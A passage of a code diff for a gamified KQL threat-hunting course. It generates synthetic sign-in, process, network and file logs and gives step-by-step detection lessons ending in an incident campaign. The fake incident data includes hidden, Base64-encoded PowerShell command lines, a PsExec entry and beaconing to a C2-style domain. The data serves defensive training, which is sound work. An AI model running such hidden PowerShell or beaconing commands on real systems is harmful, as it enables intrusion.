+    InitiatingProcessCommandLine: 'PSEXESVC.exe',
+    SHA256: 'd4e5f6a7b8c9d0e1f2a3b4c5d6e7f8a9',
+  });
+  DeviceProcessEvents.sort((a, b) => a.TimeGenerated - b.TimeGenerated);
+
+  // ---------------- DeviceNetworkEvents ----------------
+  const DeviceNetworkEvents = [];
+  const normalRemote = ['13.107.42.14', '52.113.194.132', '204.79.197.219', '20.190.151.68'];
+  for (let i = 0; i < 200; i++) {
+    DeviceNetworkEvents.push({
+      TimeGenerated: ago(rnd() * 7 * D),
+      DeviceName: pick(devices),
+      RemoteIP: pick(normalRemote),
+      RemotePort: pick([443, 443, 443, 80]),
+      RemoteUrl: pick(['login.microsoftonline.com', 'graph.microsoft.com', 'outlook.office365.com']),
+      InitiatingProcessFileName: pick(['chrome.exe', 'teams.exe', 'outlook.exe']),
+      InitiatingProcessCommandLine: 'n/a',
+    });
+  }
+  // C2 beacon traffic from FIN-WKS-014 (payload download + repeated beaconing)
+  DeviceNetworkEvents.push({
+    TimeGenerated: ago(2 * H + 19 * M),
+    DeviceName: 'FIN-WKS-014',
+    RemoteIP: '91.219.237.15',
+    RemotePort: 443,
+    RemoteUrl: 'cdn-analytics-update.net',
+    InitiatingProcessFileName: 'powershell.exe',
+    InitiatingProcessCommandLine: 'powershell.exe -NoP -W Hidden -Enc SQBFAFgA...',
+  });
+  for (let i = 0; i < 6; i++) {
+    DeviceNetworkEvents.push({
+      TimeGenerated: ago(2 * H - i * 15 * M),
+      DeviceName: 'FIN-WKS-014',
+      RemoteIP: '91.219.237.15',
+      RemotePort: 443,
+      RemoteUrl: 'cdn-analytics-update.net',
+      InitiatingProcessFileName: 'upd.ps1'.length ? 'powershell.exe' : 'powershell.exe',
+      InitiatingProcessCommandLine: 'powershell.exe -W Hidden -File upd.ps1',
+    });
+  }
+  DeviceNetworkEvents.sort((a, b) => a.TimeGenerated - b.TimeGenerated);
+
+  // ---------------- DeviceFileEvents ----------------
+  const DeviceFileEvents = [];
+  const normalFiles = [
+    { FileName: 'Q3_Report.xlsx', FolderPath: 'C:\\Users\\shared\\Documents', ActionType: 'FileCreated' },
+    { FileName: 'notes.docx', FolderPath: 'C:\\Users\\shared\\Documents', ActionType: 'FileModified' },
+    { FileName: 'cache.dat', FolderPath: 'C:\\ProgramData\\Cache', ActionType: 'FileCreated' },
+  ];
+  for (let i = 0; i < 150; i++) {
+    const f = pick(normalFiles);
+    DeviceFileEvents.push({
+      TimeGenerated: ago(rnd() * 7 * D),
+      DeviceName: pick(devices),
+      FileName: f.FileName,
+      FolderPath: f.FolderPath,
+      ActionType: f.ActionType,
+      SHA256: 'f0'.repeat(32),
+      InitiatingProcessFileName: pick(['explorer.exe', 'excel.exe', 'winword.exe']),
+    });
+  }
+  // malicious payload dropped + macro doc
+  DeviceFileEvents.push({
+    TimeGenerated: ago(2 * H + 21 * M),
+    DeviceName: 'FIN-WKS-014',
+    FileName: 'Invoice_Q3_Overdue.docm',
+    FolderPath: 'C:\\Users\\jchen\\Downloads',
+    ActionType: 'FileCreated',
+    SHA256: '9f8e7d6c5b4a39281706f5e4d3c2b1a0',
+    InitiatingProcessFileName: 'OUTLOOK.EXE',
+  });
+  DeviceFileEvents.push({
+    TimeGenerated: ago(2 * H + 18 * M + 30000),
+    DeviceName: 'FIN-WKS-014',
+    FileName: 'upd.ps1',
+    FolderPath: 'C:\\Users\\jchen\\AppData\\Roaming',
+    ActionType: 'FileCreated',
+    SHA256: '1a2b3c4d5e6f7a8b9c0d1e2f3a4b5c6d',
+    InitiatingProcessFileName: 'powershell.exe',
+  });
+  DeviceFileEvents.sort((a, b) => a.TimeGenerated - b.TimeGenerated);
+
+  const tables = { SigninLogs, DeviceProcessEvents, DeviceNetworkEvents, DeviceFileEvents };
+  Object.entries(tables).forEach(([name, rows]) => {
+    rows.forEach((r, i) => { r.__rid = `${name}_${i}`; });
+  });
+  return tables;
+}
+
+// ============================================================
+// KQL QUEST — module-based curriculum.
+// Each MODULE is one scenario. Each step's solutionQuery is a
+// complete, runnable query that (almost always) extends the
+// previous step's query by one more pipeline stage — so the
+// player keeps building on what they already wrote instead of
+// starting from a blank page every question.
+// ============================================================
+
+const MODULES = [
+  // ============== LEVEL 1 — KQL RECRUIT ==============
+  {
+    id: 'M01', level: 1, title: 'The Midnight Login', codename: 'INCIDENT 02:47', dataset: 'SigninLogs',
+    intro: `🚨 It's 02:47 AM. The Nightwave Dynamics SOC has received an alert that an employee account may be compromised.\n\nYour incident responder asks: "Can you find the failed sign-in attempts? Start broad, then narrow it down with me."`,
+    steps: [
+      {
+        objective: 'Find every failed sign-in attempt in SigninLogs, regardless of when it happened.',
+        thinkThrough: ['Which table stores authentication events?', 'What ResultType value means the sign-in did NOT succeed?'],
+        concepts: ['tables', 'where'], xp: 90,
+        solutionQuery: `SigninLogs | where ResultType != 0`,
+        hints: ['`where` filters rows by a condition.', 'ResultType of 0 means success — so "failed" is everything else.', 'Try: `SigninLogs | where ResultType != 0`'],
+        explainNote: '`!= 0` catches every non-success result code, not just one specific failure reason — much safer than guessing a single error code.',
+      },
+      {
+        objective: 'Good start. Now narrow that down to just the last 24 hours — that\'s the responder\'s actual window of concern.',
+        concepts: ['where', 'ago', 'datetime'], xp: 110,
+        solutionQuery: `SigninLogs | where ResultType != 0 | where TimeGenerated > ago(24h)`,
+        hints: ['You don\'t need to touch your first line — just add a second `where` stage.', '`ago(24h)` gives you a timestamp 24 hours before now.', 'Try adding: `| where TimeGenerated > ago(24h)`'],
+        explainNote: 'Multiple `where` stages chained with `|` behave exactly like combining them with `and` — real analysts often build queries exactly this way, one condition at a time.',
+      },
+      {
+        objective: 'Now trim the columns down to just what the responder actually needs: username, source IP, and the timestamp.',
+        concepts: ['project'], xp: 110,
+        solutionQuery: `SigninLogs | where ResultType != 0 | where TimeGenerated > ago(24h) | project UserPrincipalName, IPAddress, TimeGenerated`,
+        hints: ['Add one more stage with `project`.', 'Syntax: `| project Col1, Col2, Col3`', 'Try adding: `| project UserPrincipalName, IPAddress, TimeGenerated`'],
+        explainNote: '`project` reshapes each row down to only the columns you name — a clean final touch after filtering.',
+      },
+      {
+        objective: 'Finish it off — put the most recent attempts at the top.',
+        concepts: ['sort', 'order by'], xp: 100,
+        solutionQuery: `SigninLogs | where ResultType != 0 | where TimeGenerated > ago(24h) | project UserPrincipalName, IPAddress, TimeGenerated | sort by TimeGenerated desc`,
+        hints: ['One more stage: `sort by`.', '`desc` means newest/largest first.', 'Try adding: `| sort by TimeGenerated desc`'],
+        explainNote: 'You just built a complete, four-stage investigative query one piece at a time — this is exactly how real KQL queries get written.',
+      },
+    ],
+  },
+
+  // ============== LEVEL 2 — DATA TRACKER ==============
+  {
+    id: 'M02', level: 2, title: 'Count the Suspects', codename: 'PER-USER TALLY', dataset: 'SigninLogs',
+    intro: `Now that you can filter, it's time to start measuring. Your lead wants to know which accounts are taking the most failed attempts — ranked, not just listed.`,
+    steps: [
+      {
+        objective: 'Start over with the same failed-login filter — this time you\'re going to measure it, not just list it.',
+        concepts: ['where'], xp: 80,
+        solutionQuery: `SigninLogs | where ResultType != 0`,
+        hints: ['Same filter as before: ResultType != 0.', 'Try: `SigninLogs | where ResultType != 0`'],
+      },
+      {
+        objective: 'Group those failures by account, and count how many each user has.',
+        concepts: ['summarize', 'count()'], xp: 140,
+        solutionQuery: `SigninLogs | where ResultType != 0 | summarize FailedAttempts=count() by UserPrincipalName`,
+        hints: ['`summarize` groups rows and computes an aggregate per group.', 'Syntax: `summarize NewColumn=count() by GroupingColumn`', 'Try adding: `| summarize FailedAttempts=count() by UserPrincipalName`'],
+        explainNote: '`summarize X=count() by Y` produces one output row per distinct value of Y, with X holding the row count in that group.',
+      },
+      {
+        objective: 'Put the worst offenders at the top.',
+        concepts: ['sort'], xp: 100,
+        solutionQuery: `SigninLogs | where ResultType != 0 | summarize FailedAttempts=count() by UserPrincipalName | sort by FailedAttempts desc`,
+        hints: ['Add `sort by` on the column you just created.', 'Try adding: `| sort by FailedAttempts desc`'],
+      },
+      {
+        objective: 'Now cut the noise — keep only accounts with more than 5 failed attempts.',
+        concepts: ['where after summarize'], xp: 160,
+        solutionQuery: `SigninLogs | where ResultType != 0 | summarize FailedAttempts=count() by UserPrincipalName | sort by FailedAttempts desc | where FailedAttempts > 5`,
+        hints: ['You can pipe into another `where` even after `summarize` — it just filters the summarized rows instead of the raw ones.', 'Try adding: `| where FailedAttempts > 5`'],
+        explainNote: 'Filtering after summarize is one of the most common two-stage patterns in real hunting queries: aggregate first, then keep only the groups that cross a threshold.',
+      },
+    ],
+  },
+  {
+    id: 'M03', level: 2, title: 'Search & Narrow', codename: 'FREE-TEXT SWEEP', dataset: 'DeviceProcessEvents',
+    intro: `A threat intel report just landed with one keyword: "powershell." You don't know which column it lives in yet — so start broad, then narrow once you find it.`,
+    steps: [
+      {
+        objective: 'Sweep every column of DeviceProcessEvents for the keyword "powershell."',
+        thinkThrough: ['Is there an operator that checks every column at once, instead of one specific field?'],
+        concepts: ['search'], xp: 100,
+        solutionQuery: `DeviceProcessEvents | search "powershell"`,
+        hints: ['`where` checks one field — you need something broader.', '`search "keyword"` scans every column in the current row set.', 'Try: `DeviceProcessEvents | search "powershell"`'],
+      },
+      {
+        objective: 'Now that you know where it lives, replace your search with a precise filter on the FileName column.',
+        concepts: ['where'], xp: 120,
+        solutionQuery: `DeviceProcessEvents | where FileName == "powershell.exe"`,
+        hints: ['This time, edit your existing line instead of adding a new one — swap `search "..."` for a `where` condition on FileName.', 'Try: `DeviceProcessEvents | where FileName == "powershell.exe"`'],
+        explainNote: '`search` is great for early triage; once you know the exact field, `where` is faster and clearer.',
+      },
+      {
+        objective: 'Go further — keep only the ones using an encoded/obfuscated command, flagged by "-Enc" in the command line.',
+        concepts: ['contains', 'string operators'], xp: 160,
+        solutionQuery: `DeviceProcessEvents | where FileName == "powershell.exe" | where ProcessCommandLine contains "-Enc"`,
+        hints: ['"-Enc" sits inside a longer string, so you need substring matching, not a whole-word match.', '`contains` is case-insensitive substring matching.', 'Try adding: `| where ProcessCommandLine contains "-Enc"`'],
+        explainNote: 'Attackers Base64-encode PowerShell commands to dodge simple string matches — but the `-Enc`/`-EncodedCommand` flag itself is a reliable tell.',
+      },
+    ],
+  },
+  {
+    id: 'M04', level: 2, title: 'Foreign Signal', codename: 'GEO FILTER', dataset: 'SigninLogs',
+    intro: `Nightwave Dynamics has no employees outside North America and Western Europe. A login from Russia is automatically worth a look.`,
+    steps: [
+      {
+        objective: 'Find every sign-in from Location "RU".',
+        concepts: ['where'], xp: 100,
+        solutionQuery: `SigninLogs | where Location == "RU"`,
+        hints: ['Compare the Location column to "RU".', 'Try: `SigninLogs | where Location == "RU"`'],
+      },
+      {
+        objective: 'Narrow that further to only the ones that actually succeeded — those are the real problem.',
+        concepts: ['where', 'and/or'], xp: 160,
+        solutionQuery: `SigninLogs | where Location == "RU" | where ResultType == 0`,
+        hints: ['Add a second `where` for ResultType == 0.', 'Try adding: `| where ResultType == 0`'],
+        explainNote: 'A successful login from an impossible location is one of the highest-signal indicators of account compromise.',
+      },
+    ],
+  },
+
+  // ============== LEVEL 3 — HUNTER ==============
+  {
+    id: 'M05', level: 3, title: 'The Spray', codename: 'BOSS — THE PASSWORD SPRAYER', boss: true, dataset: 'SigninLogs',
+    intro: `👾 BOSS BATTLE\n\nMultiple employees report suspicious login notifications. The SOC believes someone is running a password-spraying attack — many accounts, few attempts each, inside a tight time window, from the same source.\n\nBuild the detector one stage at a time.`,
+    steps: [
+      {
+        objective: 'Start with every failed sign-in, same as always.',
+        concepts: ['where'], xp: 100,
+        solutionQuery: `SigninLogs | where ResultType != 0`,
+        hints: ['`where ResultType != 0`', 'Try: `SigninLogs | where ResultType != 0`'],
+      },
+      {
+        objective: 'This time, bucket time into 30-minute windows and count failures per user, per window.',
+        thinkThrough: ['Can you group by both a user AND a time bucket at once?'],
+        concepts: ['summarize', 'bin'], xp: 220,
+        solutionQuery: `SigninLogs | where ResultType != 0 | summarize Attempts=count() by UserPrincipalName, TimeBucket=bin(TimeGenerated, 30m)`,
+        hints: ['`bin(TimeGenerated, 30m)` rounds each timestamp down to its 30-minute window.', 'Use it as a `by` key alongside the user: `by UserPrincipalName, TimeBucket=bin(TimeGenerated, 30m)`.', 'Try adding: `| summarize Attempts=count() by UserPrincipalName, TimeBucket=bin(TimeGenerated, 30m)`'],
+        explainNote: '`bin()` is the key to time-windowed analysis — it turns a continuous timestamp into discrete buckets you can group by.',
+      },
+      {
+        objective: 'Keep only the windows where a single account failed more than 10 times.',
+        concepts: ['where after summarize'], xp: 220,
+        solutionQuery: `SigninLogs | where ResultType != 0 | summarize Attempts=count() by UserPrincipalName, TimeBucket=bin(TimeGenerated, 30m) | where Attempts > 10`,
+        hints: ['Pipe into another `where`, this time on your new Attempts column.', 'Try adding: `| where Attempts > 10`'],
+      },
+      {
+        objective: 'Sort so the worst-hit accounts are on top — you just built a real password-spray detector.',
+        concepts: ['sort'], xp: 180,
+        solutionQuery: `SigninLogs | where ResultType != 0 | summarize Attempts=count() by UserPrincipalName, TimeBucket=bin(TimeGenerated, 30m) | where Attempts > 10 | sort by Attempts desc`,
+        hints: ['Try adding: `| sort by Attempts desc`'],
+        boss: true, badge: 'password_spray_slayer',
+        explainNote: 'This four-stage pattern — filter, bucket-and-count, threshold, sort — is the backbone of a huge fraction of real Sentinel analytics rules.',
+      },
+    ],
+  },
+  {
+    id: 'M06', level: 3, title: 'How Many Doors', codename: 'SOURCE DIVERSITY', dataset: 'SigninLogs',
+    intro: `A single user failing logins from one IP is usually just a typo. The same user failing from many different IPs is a different story entirely.`,
+    steps: [
+      { objective: 'Start with every failed sign-in.', concepts: ['where'], xp: 90, solutionQuery: `SigninLogs | where ResultType != 0`, hints: ['`SigninLogs | where ResultType != 0`'] },
+      {
+        objective: 'For each user, count the number of distinct source IPs they failed from.',
+        concepts: ['dcount'], xp: 170,
+        solutionQuery: `SigninLogs | where ResultType != 0 | summarize UniqueIPs=dcount(IPAddress) by UserPrincipalName`,
+        hints: ['`count()` counts rows; you want unique values of one column instead.', '`dcount(ColumnName)` gives a distinct count.', 'Try adding: `| summarize UniqueIPs=dcount(IPAddress) by UserPrincipalName`'],
+        explainNote: 'A high distinct-IP count on one account is a classic password-spray or credential-stuffing signal.',
+      },
+      { objective: 'Sort to bring the most scattered accounts to the top.', concepts: ['sort'], xp: 100, solutionQuery: `SigninLogs | where ResultType != 0 | summarize UniqueIPs=dcount(IPAddress) by UserPrincipalName | sort by UniqueIPs desc`, hints: ['Try adding: `| sort by UniqueIPs desc`'] },
+    ],
+  },
+
+  // ============== LEVEL 4 — INVESTIGATOR ==============
+  {
+    id: 'M07', level: 4, title: 'Tag & Split', codename: 'DERIVED SIGNAL', dataset: 'SigninLogs',
+    intro: `Rather than filtering rows away, your lead wants a new column that flags risky logins so an analyst can eyeball everything at once — then filter down once the tag exists.`,
+    steps: [
+      {
+        objective: 'Add a column RiskyLogin that is true when the login succeeded (ResultType == 0) from Location "RU".',
+        concepts: ['extend', 'iff'], xp: 180,
+        solutionQuery: `SigninLogs | extend RiskyLogin = iff(ResultType == 0 and Location == "RU", true, false)`,
+        hints: ['`extend` adds a new column while keeping the old ones.', '`iff(condition, valueIfTrue, valueIfFalse)` is KQL\'s inline conditional.', 'Try: `SigninLogs | extend RiskyLogin = iff(ResultType == 0 and Location == "RU", true, false)`'],
+      },
+      { objective: 'Now trim it down to just UserPrincipalName, Location, and your new RiskyLogin column.', concepts: ['project'], xp: 100, solutionQuery: `SigninLogs | extend RiskyLogin = iff(ResultType == 0 and Location == "RU", true, false) | project UserPrincipalName, Location, RiskyLogin`, hints: ['Try adding: `| project UserPrincipalName, Location, RiskyLogin`'] },
+      { objective: 'Finally, keep only the rows actually flagged as risky.', concepts: ['where'], xp: 140, solutionQuery: `SigninLogs | extend RiskyLogin = iff(ResultType == 0 and Location == "RU", true, false) | project UserPrincipalName, Location, RiskyLogin | where RiskyLogin == true`, hints: ['Try adding: `| where RiskyLogin == true`'], explainNote: '`extend` → `project` → `where` is a natural arc: compute a signal, shape the output, then filter on the signal you just built.' },
+    ],
+  },
+  {
+    id: 'M08', level: 4, title: 'Staying Power', codename: 'PERSISTENCE MECHANISM', dataset: 'DeviceProcessEvents',
+    intro: `An attacker who gets in once wants to survive a reboot. One of the oldest tricks: register a scheduled task that keeps re-launching their payload.`,
+    steps: [
+      { objective: 'Find every use of schtasks.exe, the built-in Windows scheduled-task tool.', concepts: ['where', 'LOLBins'], xp: 130, solutionQuery: `DeviceProcessEvents | where FileName == "schtasks.exe"`, hints: ['`FileName == "schtasks.exe"`'] },
+      { objective: 'Narrow it to task creation specifically — the "/create" flag registers a brand-new task.', concepts: ['contains'], xp: 150, solutionQuery: `DeviceProcessEvents | where FileName == "schtasks.exe" | where ProcessCommandLine contains "/create"`, hints: ['`/delete` or `/query` would mean something else — you want `/create`.', 'Try adding: `| where ProcessCommandLine contains "/create"`'], explainNote: 'LOLBins (Living-Off-the-Land Binaries) are legitimate OS tools abused for malicious ends — they rarely trigger antivirus.' },
+      { objective: 'Trim the output to the columns that tell the story: time, device, and the full command line.', concepts: ['project'], xp: 100, solutionQuery: `DeviceProcessEvents | where FileName == "schtasks.exe" | where ProcessCommandLine contains "/create" | project TimeGenerated, DeviceName, ProcessCommandLine`, hints: ['Try adding: `| project TimeGenerated, DeviceName, ProcessCommandLine`'] },
+    ],
+  },
+  {
+    id: 'M09', level: 4, title: 'Follow the Payload', codename: 'DROPPED FILE', dataset: 'DeviceFileEvents',
+    intro: `The scheduled task pointed at a script file on disk. Find where and when it was written.`,
+    steps: [
+      { objective: 'Find the file named "upd.ps1".', concepts: ['where'], xp: 120, solutionQuery: `DeviceFileEvents | where FileName == "upd.ps1"`, hints: ['`FileName == "upd.ps1"`'] },
+      { objective: 'Narrow it to the moment it was actually written to disk, not just referenced.', concepts: ['where', 'ActionType'], xp: 150, solutionQuery: `DeviceFileEvents | where FileName == "upd.ps1" | where ActionType == "FileCreated"`, hints: ['ActionType distinguishes creation, modification, and deletion.', 'Try adding: `| where ActionType == "FileCreated"`'] },
+    ],
+  },
+  {
+    id: 'M10', level: 4, title: 'The Beacon', codename: 'PHONE HOME', dataset: 'DeviceNetworkEvents',
+    intro: `Malware that lands on a host almost always "phones home." Regular, repeated connections to the same odd destination are the tell.`,
+    steps: [
+      { objective: 'Count connections grouped by device and destination domain.', concepts: ['summarize'], xp: 160, solutionQuery: `DeviceNetworkEvents | summarize Connections=count() by DeviceName, RemoteUrl`, hints: ['Group by two columns at once, separated by a comma.', 'Try: `DeviceNetworkEvents | summarize Connections=count() by DeviceName, RemoteUrl`'] },
+      { objective: 'Keep only the pairs with more than 3 connections — a handful of repeat hits to an unfamiliar domain is your signal.', concepts: ['where after summarize'], xp: 150, solutionQuery: `DeviceNetworkEvents | summarize Connections=count() by DeviceName, RemoteUrl | where Connections > 3`, hints: ['Try adding: `| where Connections > 3`'] },
+      { objective: 'Sort so the noisiest beacon rises to the top.', concepts: ['sort'], xp: 100, solutionQuery: `DeviceNetworkEvents | summarize Connections=count() by DeviceName, RemoteUrl | where Connections > 3 | sort by Connections desc`, hints: ['Try adding: `| sort by Connections desc`'] },
+    ],
+  },
+
+  // ============== LEVEL 5 — THREAT HUNTER ==============
+  {
+    id: 'M11', level: 5, title: 'Connect the Dots', codename: 'CROSS-SOURCE JOIN', dataset: 'SigninLogs + DeviceProcessEvents',
+    intro: `You suspect the account under attack in the sign-in logs is the same one running suspicious processes on an endpoint — but SigninLogs uses full UPNs and DeviceProcessEvents uses bare account names.`,
+    steps: [
+      { objective: 'Start with the failed sign-ins, as always.', concepts: ['where'], xp: 90, solutionQuery: `SigninLogs | where ResultType != 0`, hints: ['`SigninLogs | where ResultType != 0`'] },
+      { objective: 'Derive an AccountName column holding just the part of the UPN before the "@".', concepts: ['extend', 'split', 'tostring'], xp: 180, solutionQuery: `SigninLogs | where ResultType != 0 | extend AccountName = tostring(split(UserPrincipalName, "@")[0])`, hints: ['`split(text, separator)` breaks a string into an array of pieces.', 'Index [0] gets the first piece; wrap it in `tostring()`.', 'Try adding: `| extend AccountName = tostring(split(UserPrincipalName, "@")[0])`'] },
+      { objective: 'Now join to DeviceProcessEvents on that AccountName to see endpoint activity tied to these users.', concepts: ['join', 'correlation'], xp: 220, solutionQuery: `SigninLogs | where ResultType != 0 | extend AccountName = tostring(split(UserPrincipalName, "@")[0]) | join kind=inner (DeviceProcessEvents) on AccountName`, hints: ['`join kind=inner (OtherTable) on KeyColumn` matches rows where the key is equal on both sides.', 'Try adding: `| join kind=inner (DeviceProcessEvents) on AccountName`'], explainNote: 'Joins are how real investigations connect identity events to endpoint events — almost every serious hunt eventually needs one.' },
+    ],
+  },
+  {
+    id: 'M12', level: 5, title: 'Impossible Travel', codename: 'BOSS — TWO PLACES AT ONCE', boss: true, dataset: 'SigninLogs',
+    intro: `👾 BOSS BATTLE\n\nA classic detection: the same account successfully signs in from two different countries within minutes of each other. No human travels that fast.`,
+    steps: [
+      { objective: 'Start with every successful sign-in.', concepts: ['where'], xp: 100, solutionQuery: `SigninLogs | where ResultType == 0`, hints: ['`SigninLogs | where ResultType == 0`'] },
+      {
+        objective: 'Join this to a copy of itself on UserPrincipalName — a self-join lets you compare a user\'s events to their own other events.',
+        thinkThrough: ['How do you compare a table to itself?'],
+        concepts: ['join (self)'], xp: 220,
+        solutionQuery: `SigninLogs | where ResultType == 0 | join kind=inner (SigninLogs | where ResultType == 0) on UserPrincipalName`,
+        hints: ['You can put an entire filtered sub-query inside the join\'s parentheses.', 'Try adding: `| join kind=inner (SigninLogs | where ResultType == 0) on UserPrincipalName`'],
+      },
+      {
+        objective: 'Keep only pairs where the location differs and it isn\'t the row matching itself.',
+        concepts: ['datetime math'], xp: 200,
+        solutionQuery: `SigninLogs | where ResultType == 0 | join kind=inner (SigninLogs | where ResultType == 0) on UserPrincipalName | where Location != Location1 and TimeGenerated != TimeGenerated1`,
+        hints: ['When both sides share a column name, the engine suffixes the right side with "1" — e.g. Location1, TimeGenerated1.', 'Try adding: `| where Location != Location1 and TimeGenerated != TimeGenerated1`'],
+      },
+      {
+        objective: 'Finally, keep only pairs within 15 minutes of each other — anything wider isn\'t physically impossible.',
+        concepts: ['datetime math', 'abs'], xp: 180,
+        solutionQuery: `SigninLogs | where ResultType == 0 | join kind=inner (SigninLogs | where ResultType == 0) on UserPrincipalName | where Location != Location1 and TimeGenerated != TimeGenerated1 | where abs(TimeGenerated - TimeGenerated1) < 900000`,
+        hints: ['Subtracting two datetimes gives you a millisecond difference. 900000 ms = 15 minutes.', 'Wrap it in `abs()` since the difference could be negative depending on row order.', 'Try adding: `| where abs(TimeGenerated - TimeGenerated1) < 900000`'],
+        boss: true, badge: 'impossible_travel_hunter',
+        explainNote: 'Self-joins feel unusual at first but are exactly how "impossible travel" detections are built in production Sentinel analytics rules.',
+      },
+    ],
+  },
+  {
+    id: 'M13', level: 5, title: 'Known Bad Sources', codename: 'THREAT INTEL MATCH', dataset: 'SigninLogs',
+    intro: `Your threat intel feed just published two IP addresses tied to an active campaign. Check whether either one has touched your environment.`,
+    steps: [
+      { objective: 'Find every sign-in from the first known-bad IP, 185.220.101.47.', concepts: ['where'], xp: 120, solutionQuery: `SigninLogs | where IPAddress == "185.220.101.47"`, hints: ['`IPAddress == "185.220.101.47"`'] },
+      {
+        objective: 'Now expand your filter to check for either of the two known-bad IPs at once: 185.220.101.47 and 45.155.204.10.',
+        concepts: ['in'], xp: 170,
+        solutionQuery: `SigninLogs | where IPAddress in ("185.220.101.47", "45.155.204.10")`,
+        hints: ['This time, edit your existing `where` line rather than adding a new stage.', '`Column in (val1, val2, ...)` checks membership in a set of values.', 'Try: `SigninLogs | where IPAddress in ("185.220.101.47", "45.155.204.10")`'],
+        explainNote: 'At larger scale, real SOCs join against a dedicated watchlist table instead of hardcoding IPs — but the underlying idea is identical.',
+      },
+    ],
+  },
+
+  // ============== LEVEL 6 — SOC OPERATOR ==============
+  {
+    id: 'M14', level: 6, title: 'The Full Chain', codename: 'ONE DEVICE, MANY CLUES', dataset: 'DeviceProcessEvents + DeviceNetworkEvents',
+    intro: `FIN-WKS-014 has been flagged as compromised. Before the incident report, you need every piece of activity from that device — process launches AND network connections — in one timeline.`,
+    steps: [
+      { objective: 'Stack DeviceProcessEvents and DeviceNetworkEvents into a single combined result.', concepts: ['union'], xp: 180, solutionQuery: `union DeviceProcessEvents, DeviceNetworkEvents`, hints: ['`join` matches columns across tables; `union Table1, Table2` instead just stacks all their rows together, even with different columns.', 'Try: `union DeviceProcessEvents, DeviceNetworkEvents`'] },
+      { objective: 'Filter down to just the one compromised device.', concepts: ['where'], xp: 130, solutionQuery: `union DeviceProcessEvents, DeviceNetworkEvents | where DeviceName == "FIN-WKS-014"`, hints: ['Try adding: `| where DeviceName == "FIN-WKS-014"`'] },
+      { objective: 'Sort chronologically so the story reads start to finish.', concepts: ['sort'], xp: 100, solutionQuery: `union DeviceProcessEvents, DeviceNetworkEvents | where DeviceName == "FIN-WKS-014" | sort by TimeGenerated asc`, hints: ['Try adding: `| sort by TimeGenerated asc`'] },
+    ],
+  },
+  {
+    id: 'M15', level: 6, title: 'The Origin Story', codename: 'ROOT CAUSE', dataset: 'DeviceProcessEvents',
+    intro: `You know PowerShell ran maliciously on FIN-WKS-014. Now find out what launched it in the first place — the root cause of the entire incident.`,
+    steps: [
+      { objective: 'Find the powershell.exe process event.', concepts: ['where'], xp: 100, solutionQuery: `DeviceProcessEvents | where FileName == "powershell.exe"`, hints: ['`FileName == "powershell.exe"`'] },
+      { objective: 'Show the parent-process story: time, device, filename, and both Initiating* columns.', concepts: ['project', 'process ancestry'], xp: 160, solutionQuery: `DeviceProcessEvents | where FileName == "powershell.exe" | project TimeGenerated, DeviceName, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine`, hints: ['InitiatingProcessFileName names the parent process.', 'Try adding: `| project TimeGenerated, DeviceName, FileName, InitiatingProcessFileName, InitiatingProcessCommandLine`'], explainNote: 'A common office application spawning a scripting engine is one of the most universally-alerted-on process-ancestry patterns in endpoint security.' },
+    ],
+  },
+  {
+    id: 'M16', level: 6, title: 'No Spoon-Feeding', codename: 'INVESTIGATE THE ANOMALY', dataset: 'DeviceNetworkEvents',
+    intro: `Something on FIN-WKS-014 is reaching out to the internet at a suspicious cadence. Investigate on your own this time — minimal hand-holding.`,
+    steps: [
+      { objective: 'Filter to the one compromised device.', concepts: ['where'], xp: 100, solutionQuery: `DeviceNetworkEvents | where DeviceName == "FIN-WKS-014"`, hints: ['You\'ve done this before.'] },
+      { objective: 'Group what remains by destination and count.', concepts: ['summarize'], xp: 170, solutionQuery: `DeviceNetworkEvents | where DeviceName == "FIN-WKS-014" | summarize Connections=count() by RemoteUrl`, hints: ['Think back to how you detected beaconing earlier.'] },
+      { objective: 'Sort so the answer is obvious at a glance.', concepts: ['sort', 'synthesis'], xp: 120, solutionQuery: `DeviceNetworkEvents | where DeviceName == "FIN-WKS-014" | summarize Connections=count() by RemoteUrl | sort by Connections desc`, hints: ['Descending, so the busiest destination is first.'] },
+    ],
+  },
+];
+
+// ============== OPERATION NIGHTFALL — FINAL CAMPAIGN ==============
+// Each stage is intentionally a fresh table/angle (it's a multi-source investigation),
+// so these reset per-stage rather than chaining — the "new scenario" boundary IS the point.
+const NIGHTFALL_MODULES = [
+  {
+    id: 'NF01', level: 7, campaign: 'nightfall', title: 'Operation Nightfall — Stage 1', codename: 'THE COMPROMISED ACCOUNT', boss: true, dataset: 'SigninLogs',
+    intro: `☠️ OPERATION NIGHTFALL\n\nNightwave Dynamics is under a coordinated attack. Your SOC lead needs an incident timeline built from scratch, one stage at a time.\n\nStage 1: identify the victim.`,
+    steps: [{ objective: 'Identify the single UserPrincipalName with the most failed sign-in attempts overall.', concepts: ['summarize', 'synthesis'], xp: 300, solutionQuery: `SigninLogs | where ResultType != 0 | summarize FailedAttempts=count() by UserPrincipalName | sort by FailedAttempts desc | take 1`, hints: ['You\'ve built this exact query before.', 'Try: `SigninLogs | where ResultType != 0 | summarize FailedAttempts=count() by UserPrincipalName | sort by FailedAttempts desc | take 1`'] }],
+  },
+  {
+    id: 'NF02', level: 7, campaign: 'nightfall', title: 'Operation Nightfall — Stage 2', codename: 'THE SOURCE', boss: true, dataset: 'SigninLogs',
+    intro: `Stage 2: find where the attack is coming from — the IP behind the successful, suspicious sign-in on that account.`,
+    steps: [{ objective: 'Find the IPAddress of the successful sign-in for jchen@nightwave.io from a non-US location.', concepts: ['where'], xp: 300, solutionQuery: `SigninLogs | where UserPrincipalName == "jchen@nightwave.io" and ResultType == 0 and Location != "US"`, hints: ['Filter to the account, the success, and a non-US location, all at once.'] }],
+  },
+  {
+    id: 'NF03', level: 7, campaign: 'nightfall', title: 'Operation Nightfall — Stage 3', codename: 'PATIENT ZERO', boss: true, dataset: 'DeviceProcessEvents',
+    intro: `Stage 3: somewhere, opening an attachment gave the attacker code execution on a workstation. Find patient zero.`,
+    steps: [{ objective: 'Find the process event where winword.exe spawned another process.', concepts: ['where', 'process ancestry'], xp: 300, solutionQuery: `DeviceProcessEvents | where InitiatingProcessFileName == "winword.exe"`, hints: ['Check the InitiatingProcessFileName column for Word.'] }],
+  },
+  {
+    id: 'NF04', level: 7, campaign: 'nightfall', title: 'Operation Nightfall — Stage 4', codename: 'THE PAYLOAD CHANNEL', boss: true, dataset: 'DeviceNetworkEvents',
+    intro: `Stage 4: the malicious PowerShell needed to fetch its next-stage payload. Find the command-and-control channel.`,
